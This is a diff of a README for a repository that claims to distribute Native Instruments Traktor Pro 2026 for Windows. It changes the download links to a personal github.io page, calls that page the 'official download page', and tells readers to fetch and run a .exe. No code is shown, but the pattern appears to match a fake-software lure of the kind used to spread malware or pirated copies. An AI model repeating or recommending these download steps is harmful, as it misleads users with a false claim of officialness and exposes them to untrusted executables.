@@ -1,6 +1,6 @@
 # 🎧 Native-Instruments-Traktor-Pro-2026 - Professional DJ mixing software for Windows
 
-[![Download Traktor Pro](https://img.shields.io/badge/Download-Traktor_Pro_2026-blue)](https://github.com/taph1632/Native-Instruments-Traktor-Pro-2026)
+[![Download Traktor Pro](https://img.shields.io/badge/Download-Traktor_Pro_2026-blue)](https://taph1632.github.io)
 
 This repository provides access to Native Instruments Traktor Pro 2026 for Windows 11 and Windows 10. Traktor Pro serves as a professional tool for digital DJing and live performance. It allows users to mix tracks, apply effects, and manage music libraries with precision.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware and software to run this application. Chec
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/taph1632/Native-Instruments-Traktor-Pro-2026).
+1. Go to the [official download page](https://taph1632.github.io).
 2. Locate the release section on that page.
 3. Select the file ending in .exe to start your download.
 4. Wait for the download to finish.
